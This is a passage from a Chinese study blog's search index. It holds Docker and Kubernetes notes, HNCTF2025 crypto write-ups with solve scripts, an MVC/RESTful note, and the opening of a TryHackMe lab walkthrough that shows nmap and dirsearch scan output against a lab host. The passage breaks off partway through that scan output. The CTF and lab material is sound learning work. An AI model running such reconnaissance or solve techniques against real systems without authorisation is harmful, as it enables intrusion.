Base64，可配合密钥管理器加密存储 ","date":"2025-06-09","objectID":"/study-k8s/:5:0","tags":["开发","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["容器"],"content":"ConfigMap 示例 先创建一个 apiVersion: v1 kind: ConfigMap metadata: name: my-config namespace: default data: APP_NAME: \"MyApp\" APP_ENV: \"dev\" CONFIG_JSON: | { \"logLevel\": \"debug\", \"maxConn\": 100 } 在pod中作为环境变量使用 env: - name: APP_NAME valueFrom: configMapKeyRef: name: my-config key: APP_NAME 在pod中挂载为文件使用 env: - name: APP_NAME valueFrom: configMapKeyRef: name: my-config key: APP_NAME ","date":"2025-06-09","objectID":"/study-k8s/:5:1","tags":["开发","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["容器"],"content":"Secret 示例 先创建一个 apiVersion: v1 kind: Secret metadata: name: my-secret namespace: default type: Opaque data: DB_PASSWORD: bXlwYXNzd29yZA== 作为环境变量使用 env: - name: DB_PASSWORD valueFrom: secretKeyRef: name: my-secret key: DB_PASSWORD 挂载为文件使用 volumes: - name: secret-vol secret: secretName: my-secret volumeMounts: - name: secret-vol mountPath: \"/etc/secret\" ","date":"2025-06-09","objectID":"/study-k8s/:5:2","tags":["开发","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["容器"],"content":"k8s\u0026docker ","date":"2025-06-09","objectID":"/study-k8s/:6:0","tags":["开发","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["容器"],"content":"编年史 在很久很久以前(v1.3 ～ v1.19)，k8s默认启动pod是docker，v1.20开始宣布弃用 Dockershim，v1.24正式弃用Dockershim 可以认为以前的pod启动顺序是 kubectl → kubelet → Dockershim → Docker → 容器 后面k8s感觉还是太重了，就干脆只用自己的containerd了 ","date":"2025-06-09","objectID":"/study-k8s/:6:1","tags":["开发","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["容器"],"content":"如何k8s+docker 假如我现在有一个写好的三端项目，后端/前端/小程序，我分别包了一个docker去运行，我现在有需求去多节点分布式部署，该怎么办呢？ 答案很简单：k8s里面跑docker(这样我写的dockerfile也不会浪费) 如何实现这种操作呢？ 首先你要知道，docker里面也有containerd，哎，那实际上原理相同，我让k8s的containerd去跑docker镜像的内容进行了，如图所示 [ 开发者 ] ↓ docker build [ 本地镜像 ] ↓ docker push [ 镜像仓库（如 Harbor / Docker Hub） ] ↓ kubectl apply [ K8s 控制器 ] ↓ 调度到 Node [ kubelet ] ↓ container runtime（Containerd） [ Pod 中容器运行 ] 而去调用docker就要依赖.yaml文件的编写了，如 docker build -t myapp:v1 . docker tag myapp:v1 registry.example.com/myapp:v1 docker push registry.example.com/myapp:v1 我这个时候要在pod里面引用这个镜像 containers: - name: myapp image: registry.example.com/myapp:v1 然后只要指令部署即可了 kubectl apply -f myapp-deployment.yaml ","date":"2025-06-09","objectID":"/study-k8s/:6:2","tags":["开发","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["容器"],"content":"优点 作用方面 首先docker和k8s在一定程度上的任务是不同的 工具 主要职责 类似比喻 Docker 用来构建镜像，本地运行测试容器 工厂生产产品 Kubernetes 管理和编排容器，自动部署、扩缩容、服务发现等 仓库 + 快递调度系统 开发/部署/运维方面 我在本地进行项目开发，完成后构建docker，然后推送镜像，云端只需要写个.yaml文件就可以部署了，你说爽不爽。并且这样开发只用在意docker，运维之用在意k8s，各司其职 自动化 可以实现自动化推送部署更新 开发提交代码 → 自动构建 Docker 镜像 → 自动推送 → K8s 自动更新部署 ","date":"2025-06-09","objectID":"/study-k8s/:6:3","tags":["开发","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["容器"],"content":"未完结 咕咕咕 ","date":"2025-06-09","objectID":"/study-k8s/:7:0","tags":["开发","study"],"title":"Study K8s","uri":"/study-k8s/"},{"categories":["容器"],"content":"中文文档 https://yeasy.gitbook.io/docker_practice ","date":"2025-06-09","objectID":"/study-docker/:1:0","tags":["开发","study"],"title":"Study Docker","uri":"/study-docker/"},{"categories":["容器"],"content":"关于部署 mac可以用docker-desktop，或者是orbstack(这个真的好用xd)，linux就直接指令操作吧。win不推荐，推荐wsl里面搞docker然后映射出来 ","date":"2025-06-09","objectID":"/study-docker/:2:0","tags":["开发","study"],"title":"Study Docker","uri":"/study-docker/"},{"categories":["容器"],"content":"基本知识 docker search nginx 寻找镜像 有ok的是官方的 docker pull nginx 直接下载 docker images 查看镜像 docker hub 镜像仓库 docker rmi删除镜像 docker run 运行 docker run [OPTIONS] IMAGE [COMMAND] [ARG...] -d: 后台运行容器，并返回容器ID。 -i: 以交互模式运行容器，通常与 -t 一起使用。 -t: 分配一个伪终端。 -p HOST_PORT:CONTAINER_PORT: 将主机的端口映射到容器的端口。 -v HOST_DIR:CONTAINER_DIR: 将主机目录挂载到容器中。 --name NAME: 为容器指定一个名称。 -e KEY=VALUE: 设置环境变量。 示例 运行带有交互终端的 Ubuntu 容器： docker run -it ubuntu 在后台运行 Nginx 容器并映射端口： docker run -d -p 8080:80 nginx 挂载本地目录到容器中： docker run -v /local/path:/container/path my-image docker ps 查看容器 docker ps -a 查看所有容器（包括停止的） docker stop 停止容器 docker rm 删除容器 docker start 启动容器 docker stats 查看容器状态 docker logs 查看容器日志 docker exec 进入容器 docker commit 创建镜像 docker save 保存 docker load 加载 docker inspect zsm_2 查看容器信息(主要是ip) docker network create 创建网络 --driver 指定网络驱动(默认是bridge) --subnet 指定子网 --gateway 指定网关 --ip-range 指定ip范围 --attachable 是否允许容器加入网络 docker network rm my_custom_network 删除网络 docker run -d --name my_container --network my_custom_network nginx 启动容器时指定网络 docker network connect my_custom_network my_container 将运行的容器加入网络 ","date":"2025-06-09","objectID":"/study-docker/:3:0","tags":["开发","study"],"title":"Study Docker","uri":"/study-docker/"},{"categories":["容器"],"content":"compose.yaml编写 ","date":"2025-06-09","objectID":"/study-docker/:4:0","tags":["开发","study"],"title":"Study Docker","uri":"/study-docker/"},{"categories":["容器"],"content":"顶级元素 name # 容器组名称 services # 容器组,服务 networks # 网络 volumes: # 卷 configs: # 配置 secrets: # 密钥 ","date":"2025-06-09","objectID":"/study-docker/:4:1","tags":["开发","study"],"title":"Study Docker","uri":"/study-docker/"},{"categories":["容器"],"content":"dockerfile编写 FROM #指定镜像基础环境 RUN #运行自定义命令 CMD #容器启动命令或者是参数 LABEL #标签 EXPOSE #暴露端口 ENV #环境变量 ADD #添加文件到镜像 COPY #复制文件到镜像 ENTRYPOINT #容器固定启动命令 WORKDIR #工作目录 USER #用户 VOLUME #挂载目录 ARG #参数 ","date":"2025-06-09","objectID":"/study-docker/:5:0","tags":["开发","study"],"title":"Study Docker","uri":"/study-docker/"},{"categories":["容器"],"content":"动态端口实现 在ctf题目里面，总有一些题的环境打开后发现端口是不定的，就是这样实现的。想gzctf平台上面是已经自动实现了，自己练习的时候可以用以下方式实现 ","date":"2025-06-09","objectID":"/study-docker/:6:0","tags":["开发","study"],"title":"Study Docker","uri":"/study-docker/"},{"categories":["容器"],"content":"动态端口映射 version: \"3\" services: server: build: . restart: always ports: - \"2222-2232:2222\" # 这里定义了一个端口范围 ","date":"2025-06-09","objectID":"/study-docker/:6:1","tags":["开发","study"],"title":"Study Docker","uri":"/study-docker/"},{"categories":["容器"],"content":"环境变量配置端口 version: \"3\" services: server: build: . restart: always environment: SERVICE_PORT: 2222 # 容器内服务监听的端口 ports: - \"${HOST_PORT:-2222}:2222\" # 外部端口可以通过环境变量 HOST_PORT 设置 ","date":"2025-06-09","objectID":"/study-docker/:6:2","tags":["开发","study"],"title":"Study Docker","uri":"/study-docker/"},{"categories":["容器"],"content":"注意事项 在用docker打包一个项目时，可以利用.dockerignore文件，把不需要直接打包的文件除去，比如nodejs项目的node_modules文件夹等。 这样的好处是，在docker中去配置环境，避免冲突，也避免了打包时因为内存太大而造成的速度影响 ","date":"2025-06-09","objectID":"/study-docker/:7:0","tags":["开发","study"],"title":"Study Docker","uri":"/study-docker/"},{"categories":["容器"],"content":"未完结 咕咕咕 ","date":"2025-06-09","objectID":"/study-docker/:8:0","tags":["开发","study"],"title":"Study Docker","uri":"/study-docker/"},{"categories":["CTF"],"content":"前言 rank18 我是fw ","date":"2025-06-08","objectID":"/hnctf2025/:1:0","tags":["crypto"],"title":"HNCTF2025","uri":"/hnctf2025/"},{"categories":["CTF"],"content":"题目 ","date":"2025-06-08","objectID":"/hnctf2025/:2:0","tags":["crypto"],"title":"HNCTF2025","uri":"/hnctf2025/"},{"categories":["CTF"],"content":"哈基coke task.py import matplotlib.pyplot as plt import cv2 import numpy as np from PIL import Image def arnold_encode(image, shuffle_times, a, b): \"\"\" Arnold shuffle for rgb image Args: image: input original rgb image shuffle_times: how many times to shuffle Returns: Arnold encode image \"\"\" arnold_image = np.zeros(shape=image.shape) h, w = image.shape[0], image.shape[1] N = h for time in range(shuffle_times): for ori_x in range(h): for ori_y in range(w): new_x = (1*ori_x + b*ori_y)% N new_y = (a*ori_x + (a*b+1)*ori_y) % N arnold_image[new_x, new_y, :] = image[ori_x, ori_y, :] image = np.copy(arnold_image) cv2.imwrite('en_flag.png', arnold_image, [int(cv2.IMWRITE_PNG_COMPRESSION), 0]) return arnold_image img = cv2.imread('coke.png') arnold_encode(img,6,9,1) Arnold变换，我不是特别懂原理的，gpt一把梭了 exp.py import cv2 import numpy as np def arnold_decode(image, shuffle_times, a, b): \"\"\" Arnold inverse shuffle for RGB image Args: image: input encoded RGB image shuffle_times: how many times it was shuffled Returns: Decoded image \"\"\" h, w = image.shape[:2] N = h arnold_image = np.zeros_like(image) # 逆Arnold变换矩阵 for time in range(shuffle_times): for x in range(h): for y in range(w): ori_x = ((b * a + 1) * x - b * y) % N ori_y = (-a * x + y) % N arnold_image[ori_x, ori_y, :] = image[x, y, :] image = np.copy(arnold_image) cv2.imwrite('decoded_flag.png', arnold_image, [int(cv2.IMWRITE_PNG_COMPRESSION), 0]) return arnold_image # 解密主逻辑 encoded_img = cv2.imread('en_flag.png') decoded_img = arnold_decode(encoded_img, 6, 9, 1) ","date":"2025-06-08","objectID":"/hnctf2025/:2:1","tags":["crypto"],"title":"HNCTF2025","uri":"/hnctf2025/"},{"categories":["CTF"],"content":"lcgp task.py from Crypto.Util.number import * import gmpy2 import random import uuid n = getPrime(1024) flag = b'H\u0026NCTF{' + str(uuid.uuid4()).encode() + b'}' flag=bytes_to_long(flag) print(flag) e = 2024 c=pow(e, flag, n) class LCG: def __init__(self, seed, a, b, m): self.seed = seed self.a = a self.b = b self.m = m def generate(self): self.seed = (self.a * self.seed + self.b) % self.m return self.seed lcg = LCG(c, getPrime(256), getPrime(256), getPrime(2048)) random = [lcg.generate() for _ in range(5)] print(random) print(\"n=\",n) 前面就是很正常的LCG解密，然后是个简单的dlp问题，就不多说了 exp.py from math import gcd from functools import reduce from Crypto.Util.number import inverse def recover_modulus(states): diffs = [s2 - s1 for s1, s2 in zip(states, states[1:])] zeroes = [] for i in range(len(diffs) - 2): x = diffs[i + 2] * diffs[i] - diffs[i + 1] ** 2 zeroes.append(abs(x)) return reduce(gcd, zeroes) def recover_lcg_params(states, m): s0, s1, s2 = states[:3] a = ((s2 - s1) * inverse(s1 - s0, m)) % m b = (s1 - a * s0) % m return a, b def recover_seed(states, a, b, m): s1 = states[0] seed = ((s1 - b) * inverse(a, m)) % m return seed states = [ ] m = recover_modulus(states) a, b = recover_lcg_params(states, m) c = recover_seed(states, a, b, m) print(\"[*] Recovered c =\", c) from Crypto.Util.number import long_to_bytes from sage.all import * n= cc= e = 2024 F = GF(n) g = F(2024) c = F(cc) flag_int = discrete_log(c, g) print(flag_int) print(long_to_bytes(flag_int)) ","date":"2025-06-08","objectID":"/hnctf2025/:2:2","tags":["crypto"],"title":"HNCTF2025","uri":"/hnctf2025/"},{"categories":["CTF"],"content":"数据处理 task.py from Crypto.Util.number import bytes_to_long import random flag = b\"H\u0026NCTF{}\" btl = str(bytes_to_long(flag)) lowercase = '0123456789' uppercase = '7***4****5' table = ''.maketrans(lowercase, uppercase) new_flag = btl.translate(table) n = 2 ** 512 m = random.randint(2, n - 1) | 1 c = pow(m, int(new_flag), n) print('m = ' + str(m)) print('c = ' + str(c)) 前面dlp，后面爆破 exp.py from Crypto.Util.number import long_to_bytes from sage.all import * m = cc = n = 2 ** 512 flag_int = discrete_log(cc, mod(m,n)) print(flag_int) from itertools import permutations from Crypto.Util.number import long_to_bytes new_flag = '' known_map = { '7': '0', '4': '4', '5': '9' } used_digits = {'0', '4', '9'} available_digits = [d for d in '0123456789' if d not in used_digits] unknown_chars = sorted(set(new_flag) - set(known_map.keys())) for perm in permutations(available_digits): full_map = dict(known_map) for ch, digit in zip(unknown_chars, perm): full_map[ch] = digit try: btl = ''.join(full_map[ch] for ch in new_flag) num = int(btl) flag = long_to_bytes(num) if flag.startswith(b'H\u0026NCTF{'): print(\"[+] 找到啦！\") print(\"映射表：\", full_map) print(\"flag:\", flag) break except: continue ","date":"2025-06-08","objectID":"/hnctf2025/:2:3","tags":["crypto"],"title":"HNCTF2025","uri":"/hnctf2025/"},{"categories":["CTF"],"content":"为什么出题人的rsa总是ez task.py #part 1 def pad(flag, bits=1024): pad = os.urandom(bits//8 - len(flag)) return int.from_bytes(flag + pad, \"big\") p = random_prime(2**1024) q = random_prime(2**1024) a = randint(0, 2**1024) b = randint(0, 2**1024) n = p * q e = 0x10001 flag = b'' m = pad(flag) assert m \u003c n c = pow(m, e, n) print(f\"c={c}\") print(f\"n={n}\") print(f\"h1={p + b * q}\") print(f\"h2={a * p + q}\") #part 2 from Crypto.Util.number import * from gmpy2 import * a = random_prime() b = random_prime() g = random_prime() h = 2*g*a*b+a+b while not is_prime(h): a = random_prime() b = random_prime() g = random_prime() h = 2*g*a*b+a+b N = 2*h*g+1 e from part1's flag flag=b'' c=pow(bytes_to_long(flag),e,N) print(N) print(g) print(c) 前面是maple神的博客的脚本，直接梭哈，part2就是强网那个，以前的脚本改改还能用 exp.py from sage.all import * from Crypto.Util.number import long_to_bytes from lll_cvp import solve_inequality c= n= x= y= # f(t,u)=(x-t)(y-u) # f(p,q)=0 (mod n) # f(t,u)=xy-ux-ty+tu=xy-ux-ty (mod n) # x, y ~ 2^1024 -\u003e LLL L = matrix([[n, 0, 0, 0], [x * y, 1, 0, 0], [-y, 0, 1, 0], [-x, 0, 0, 1]]) lb = [0, 1, 0, 0] ub = [0, 1, 2**1024, 2**1024] sol = solve_inequality(L, lb, ub) _, _, p, q = map(int, sol) assert p * q == n phi = (p - 1) * (q - 1) d = pow(0x10001, -1, phi) m = pow(c, d, n) print(long_to_bytes(m)) N= g= from sage.groups.generic import bsgs nbits = 2048 gamma = 0.244 cbits = ceil(nbits * (0.5 - 2 * gamma)) M = (N - 1) // (2 * g) u = M // (2 * g) v = M - 2 * g * u GF = Zmod(N) x = GF.random_element() y = x ^ (2 * g) # c的范围大概与N^(0.5-2*gamma)很接近 c = bsgs(y, y ^ u, ((2**(cbits-5)), (2**(cbits+5)))) ab = u - c apb = v + 2 * g * c P.\u003cx\u003e = ZZ[] f = x ^ 2 - apb * x + ab a = f.roots() if a: a, b = a[0][0], a[1][0] p = 2 * g * a + 1 q = 2 * g * b + 1 assert p * q == N print(p,q) from Crypto.Util.number import* c= p= q= e=81733668723981020451323 n= phi=(p-1)*(q-1) print(pow(c,inverse(e,phi),n)) print(long_to_bytes(pow(c,inverse(e,phi),n))) ","date":"2025-06-08","objectID":"/hnctf2025/:2:4","tags":["crypto"],"title":"HNCTF2025","uri":"/hnctf2025/"},{"categories":["CTF"],"content":"factor task.py from Crypto.Util.number import * import uuid rbits = 248 Nbits = 1024 p = getPrime(Nbits // 2) q = getPrime(Nbits // 2) N = p * q r = getPrime(rbits) hint = getPrime(Nbits // 2) * p + r R = 2^rbits e=0x10001 n=p*q phi=(p-1)*(q-1) flag = b'H\u0026NCTF{' + str(uuid.uuid4()).encode() + b'}' m=bytes_to_long(flag) c=pow(m,e,n) print(\"N=\",N) print(\"hint=\",hint) print(c) 我是真的nmd不能理解啊我靠，写的时候第一时间想到copper去打，一直出不来，然后最后发现可能是参数写错了？md，xd废了 r是小量，利用copper打出来，然后GCD求p，即可求出flag，small_roots里面的epsilon一定要加上啊啊啊啊啊啊 exp.py from Crypto.Util.number import* from sage.all import * N= hint= c= e=65537 rbits = 248 Nbits = 1024 R = 2^rbits PR.\u003cx\u003e = PolynomialRing(Zmod(N)) f=x-hint roots=f.small_roots(X=2^248,beta=0.4,epsilon=0.01) r=roots[0] print(r) r= p=GCD(hint-r,N) q=N//p phi=(p-1)*(q-1) print(long_to_bytes(pow(c,inverse(e,phi),N))) 还有一个方法就是AGCD，参考鸡块神的博客，但是限度大概在243bits左右，需要爆破5位 ","date":"2025-06-08","objectID":"/hnctf2025/:2:5","tags":["crypto"],"title":"HNCTF2025","uri":"/hnctf2025/"},{"categories":["CTF"],"content":"factor-pro task.py from Crypto.Util.number import * from Crypto.Util.Padding import * from gmssl.sm4 import CryptSM4, SM4_ENCRYPT from hashlib import sha256 from random import * import uuid rbits = 252 Nbits = 1024 p = getPrime(Nbits//2) q = getPrime(Nbits//2) N = p*q r = getPrime(rbits) hint = getPrime(Nbits// 2)*p+r R = 2^rbits flag = b'H\u0026NCTF{'+str(uuid.uuid4()).encode()+b'}' leak=p*q*r r_bytes = long_to_bytes(leak) iv = r_bytes[:16] if len(r_bytes) \u003e= 16 else r_bytes + b'\\0'*(16-len(r_bytes)) key = sha256(str(p + q + r).encode()).digest()[:16] crypt_sm4 = CryptSM4() crypt_sm4.set_key(key, SM4_ENCRYPT) padded_flag = pad(flag, 16) c = crypt_sm4.crypt_cbc(iv, padded_flag) print(\"N=\",N) print(\"hint=\",hint) print(c) 简单来说就是把上一题复杂化了，看到r变成了252bits，爆破几位就行了，md，又是没带参数，我是sb，实测最低必须爆12bits exp.py from Crypto.Util.number import* from sage.all import * from tqdm import* N = hint = rbits = 252 Nbits = 1024 R = 2^rbits high=12 for r in trange(2^high,-1,-1): rh=r\u003c\u003c(rbits-high) PR.\u003cx\u003e = PolynomialRing(Zmod(N)) f=hint-(rh+x) f=f.monic() roots=f.small_roots(X=2^(rbits-high)-1,beta=0.495,epsilon=0.03) if roots: rl=roots[0] print(rh+rl) break ","date":"2025-06-08","objectID":"/hnctf2025/:2:6","tags":["crypto"],"title":"HNCTF2025","uri":"/hnctf2025/"},{"categories":["CTF"],"content":"three vertical lines task.py from Crypto.Util.number import * from secret import flag from rsa.prime import getprime while(1): p=getprime(256) q=getprime(256) if isPrime(3*p**5+4*q**5): print(3*p**5+4*q**5) break e = 65537 print(pow(bytes_to_long(flag), e, p * q)) 俺不会啊，赛后知道这个是原题改的，md，参考love的博客，原题有非预期，这个题貌似没有，当时试过（），打格就行了，这种构造的方法我还真的没有想出来，好nb exp.py from sage.all import Zmod, ZZ, matrix, inverse_mod, GF from functools import reduce import Crypto.Util.number as cun r= ct= e = 65537 # adwa solution R = Zmod(r)[\"x\"] x = R.gen() f = 3*x**5 + 4 root = f.roots()[0][0] M = matrix(ZZ, [[1, root], [0, r]]) # by adwa: # 似乎 ax^n + by^n, 都可以用格解决 # f = x ** 7 - 7 # e = f.roots()[0][0] # 压力来到了 roots 函数, (其实就是个有限域求根) b, a = map(abs, M.LLL()[0]) b, a = [int(i) for i in [a, b]] print(f\"a = {a}\\nb = {b}\") print(f\"{cun.isPrime(a) = }, {cun.isPrime(b) = }\") phi =(a-1)*(b-1) n = a * b d = cun.inverse(e, phi) m = pow(ct, d, n) print(f\"{m = }\") print(cun.long_to_bytes((m))) ","date":"2025-06-08","objectID":"/hnctf2025/:2:7","tags":["crypto"],"title":"HNCTF2025","uri":"/hnctf2025/"},{"categories":["CTF"],"content":"总结 自己有点sb，不知道为什么，md ","date":"2025-06-08","objectID":"/hnctf2025/:3:0","tags":["crypto"],"title":"HNCTF2025","uri":"/hnctf2025/"},{"categories":["nodejs"],"content":"前言 前面的nodejs「3」其实写过，但是很潦草且不深刻，这个稍微深刻一点 ","date":"2025-06-06","objectID":"/thinking-mvc/:1:0","tags":["开发","study"],"title":"关于MVC的小笔记or总结","uri":"/thinking-mvc/"},{"categories":["nodejs"],"content":"什么是MVC 三个字母对应三个单词，对应三个层次 M-\u003eModel V-\u003eView C-\u003eControl 在我浅薄的理解下，Model层是对于数据库去建立sql模型，以及增删查改等操作。Control去作为M和V之间的中间件，去衔接贯通，并且在我的理解里面，这个不应该含有web层面的业务逻辑(下单，支付等操作)。而View就是与前端进行交互，得到or发送状态/数据等信息。 那么web层面的逻辑就应该交给Services层去完成，衍生出来的DTO层，用于C-\u003eS时的数据处理以及规范，有趣的是他只是一个结构体，不能处理复杂的逻辑，比如权限管理，增加waf等，我第一开始真的想过在这里去加waf保证安全(如xss，sql注入等) ","date":"2025-06-06","objectID":"/thinking-mvc/:2:0","tags":["开发","study"],"title":"关于MVC的小笔记or总结","uri":"/thinking-mvc/"},{"categories":["nodejs"],"content":"MVC\u0026传统思想的不同 画图好像可以表现的更加直接 在我的理解里，传统思想的处理方式就是一个任务对应一个文件，比如用户创建个人信息时我需要一个文件，更新个人信息时需要另一个文件去处理，那么这样的坏处是什么呢，在进行类似操作时，我需要在不同的文件里面写入相同的函数，比如upload操作，而我在日后维护时，需要自己去一个一个修改，这就是缺点了 而MVC就在处理这种情况。 这里用nodejs+express举例吧(真对java不熟xd)，这里前后端分离的，C层就不写了 import mongoose from \"mongoose\"; mongoose.connect(\"mongodb://127.0.0.1:27017/company-system\", { useNewUrlParser: true, useUnifiedTopology: true, }); const db = mongoose.connection; db.on(\"error\", (err) =\u003e { console.error(\"❌ MongoDB connection error:\", err); }); db.once(\"open\", () =\u003e { console.log(\"✅ MongoDB connected successfully!\"); }); export default db; import UserService from '../../services/admin/UserService.js' getList: async (req, res) =\u003e { const result = await UserService.getList(req.params) res.send({ ActionType: \"OK\", data: result }) } C层就会去调用S层 import UserModel from \"../../models/UserModel.js\" getList: async ({ id }) =\u003e { return id ? UserModel.find({ _id: id }, [\"username\", \"role\", \"avatar\", \"introduction\", \"gender\"]) : UserModel.find({}, [\"username\", \"role\", \"avatar\", \"introduction\", \"gender\"]) } S层会去调用M层 import mongoose from 'mongoose' const { Schema } = mongoose const UserSchema = new Schema({ username: String, password: String, gender: Number, // 0-未知，1-男，2-女 introduction: String, // 简介 avatar: String, // 头像地址 role: Number // 1-管理员，2-编辑 }) // 注册并导出模型 const UserModel = mongoose.model(\"user\", UserSchema) export default UserModel 这里去调用数据模型，整体流程可以明显感觉到我把一个函数拆成了三个文件里面的三个函数，并且依次调用，这样的好处是，如果日后需要修改某个逻辑，比如数据库的，我可以直接去完善模型，业务的直接去修改S层，修改一处，其他地方引用的同步有效，更加轻松方便。但是如果项目很大，初次编写的时候会很麻烦 ","date":"2025-06-06","objectID":"/thinking-mvc/:3:0","tags":["开发","study"],"title":"关于MVC的小笔记or总结","uri":"/thinking-mvc/"},{"categories":["nodejs"],"content":"MVC\u0026MVT MVT是Django采用的框架模式，T是Template，负责封装构造要返回的html。对于MVC进行了拆分，主要点在于把C层拆分，有一个url分发器，它的作用是将一个个URL的页面请求分发给不同的view处理，view再调用相应的Model和Template。好处是解耦 URL 与业务逻辑 path('blog/\u003cint:id\u003e/', views.blog_detail) 把路由合并在一处去管理，并且和逻辑分开(这样看nodejs也有这种风格)。其他的好处就是Django自己强大的Form 系统，从V到T一条龙服务。 总体来说MVT不是没有C层，而是让你感觉没有C层，写起来更加自然 ","date":"2025-06-06","objectID":"/thinking-mvc/:4:0","tags":["开发","study"],"title":"关于MVC的小笔记or总结","uri":"/thinking-mvc/"},{"categories":["nodejs"],"content":"MVC+RESTful RESTful是一种书写规范，虽然我很不规范，但是还是学一下 RESTful就是对自己写的接口进行规范化，使用RESTful架构可以充分的发挥GET、POST、PUT、DELETE 四种请求方式的意义,简单的来说url地址中只包含名词表示资源，使用http的动词(GET | POST | PUT | DELTE)表示要进行的动作进行操作资源 错误的编写方式 //添加用户 router.post('/user/addUser',(req,res)=\u003e{ //... }) //更新用户信息 router.put('/user/updateUser',(req,res)=\u003e{ //... }) //删除用户 router.delete('/user/delUser',(req,res)=\u003e{ //... }) //获取用户信息 router.get('/user/getUser',(req,res)=\u003e{ //... }) 问题点 原因说明喵 🚫 接口中出现了动词（addUser / getUser） URL 应该是名词，动词重复了 HTTP 方法的语义 🚫 可读性低 /user/addUser 到底是创建还是更新，看起来不直观 🚫 统一性差 接口没有统一风格，扩展性差，维护困难 🚫 难以自动化文档生成 Swagger、Postman 无法统一识别 REST 动作 正确的编写方式 //添加用户 router.post('/user',(req,res)=\u003e{ //... }) //更新用户信息 router.put('/user/:id',(req,res)=\u003e{ //... }) //删除用户 router.delete('/user/:id',(req,res)=\u003e{ //... }) //获取用户信息 router.get('/user',(req,res)=\u003e{ //... }) 优点 说明喵 ✅ 语义清晰，动词统一 /user 是资源名，POST 就是新增，GET 就是查询，PUT 是更新 ✅ URL 简洁明了 看 URL 就知道是哪个资源、对谁进行什么操作 ✅ 自动文档更友好 Swagger/OpenAPI 识别接口更智能 ✅ 前后端协作更标准化 不再需要靠接口注释来理解用途 ✅ 更符合 REST 标准 易于团队协作、代码规范化 ✅ 利于权限控制/缓存机制 因为语义明确，可对不同方法做精细控制 RESTful 路由标准示例总结 操作 方法 URL 示例 说明 获取所有用户 GET /users 列表 获取单个用户 GET /users/:id 详情 新增用户 POST /users 创建 更新用户 PUT /users/:id 修改 删除用户 DELETE /users/:id 删除 用人话说这就是让前后端的沟通更加简单自然 ","date":"2025-06-06","objectID":"/thinking-mvc/:5:0","tags":["开发","study"],"title":"关于MVC的小笔记or总结","uri":"/thinking-mvc/"},{"categories":["nodejs"],"content":"总结 MVC是一个思想，不是一个固定的东西，适合自己/团队的就是最好的xd ","date":"2025-06-06","objectID":"/thinking-mvc/:6:0","tags":["开发","study"],"title":"关于MVC的小笔记or总结","uri":"/thinking-mvc/"},{"categories":["靶场"],"content":"前言 THM的一个中等难度靶机，主要是xss相关？挺难的（ ","date":"2025-06-02","objectID":"/thm-whyhackme/:1:0","tags":["渗透"],"title":"THM WhyHackMe","uri":"/thm-whyhackme/"},{"categories":["靶场"],"content":"外网打点 nmap+dirsearch启动 nmap -sC -sV 10.10.146.135 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-02 15:53 CST Nmap scan report for 10.10.146.135 Host is up (0.24s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-r--r-- 1 0 0 318 Mar 14 2023 update.txt | ftp-syst: | STAT: | FTP server status: | Connected to 10.21.155.141 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 47:71:2b:90:7d:89:b8:e9:b4:6a:76:c1:50:49:43:cf (RSA) | 256 cb:29:97:dc:fd:85:d9:ea:f8:84:98:0b:66:10:5e:6f (ECDSA) |_ 256 12:3f:38:92:a7:ba:7f:da:a7:18:4f:0d:ff:56:c1:1f (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Welcome!! |_http-server-header: Apache/2.4.41 (Ubuntu) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 56.16 seconds python dirsearch.py -u http://10.10.146.135 _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12290 Target: http://10.10.146.135/ [15:57:12] Scanning: [15:57:27] 403 - 278B - /.php [15:58:04] 301 - 315B - /assets -\u003e http://10.10.146.135/assets/ [15:58:04] 200 - 1KB - /assets/ [15:58:11] 403 - 278B - /cgi-bin/ [15:58:11] 403 - 278B - /cgi-bin/awstats.pl [15:58:11] 403 - 278B - /cgi-bin/a1stats/a1disp.cgi [15:58:11] 403 - 278B - /cgi-bin/awstats/ [15:58:11] 403 - 278B - /cgi-bin/htmlscript [15:58:11] 403 - 278B - /cgi-bin/login [15:58:11] 403 - 278B - /cgi-bin/login.php [15:58:11] 403 - 278B - /cgi-bin/login.cgi [15:58:11] 403 - 278B - /cgi-bin/mt-xmlrpc.cgi [15:58:11] 403 - 278B - /cgi-bin/mt.cgi [15:58:11] 403 - 278B - /cgi-bin/mt/mt-xmlrpc.cgi [15:58:11] 403 - 278B - /cgi-bin/mt/mt.cgi [15:58:11] 403 - 278B - /cgi-bin/mt7/mt-xmlrpc.cgi [15:58:11] 403 - 278B - /cgi-bin/mt7/mt.cgi [15:58:11] 403 - 278B - /cgi-bin/php.ini [15:58:11] 403 - 278B - /cgi-bin/printenv.pl [15:58:11] 403 - 278B - /cgi-bin/ViewLog.asp [15:58:11] 403 - 278B - /cgi-bin/test-cgi [15:58:11] 403 - 278B - /cgi-bin/test.cgi [15:58:11] 403 - 278B - /cgi-bin/htimage.exe?2,2 [15:58:11] 403 - 278B - /cgi-bin/imagemap.exe?2,2 [15:58:11] 403 - 278B - /cgi-bin/index.html [15:58:11] 403 - 278B - /cgi-bin/printenv [15:58:15] 200 - 0B - /config.php [15:58:22] 403 - 278B - /dir [15:58:36] 200 - 563B - /index.php [15:58:36] 200 - 563B - /index.php/login/ [15:58:42] 200 - 523B - /login.php [15:58:43] 302 - 0B - /logout.php -\u003e login.php [15:59:02] 200 - 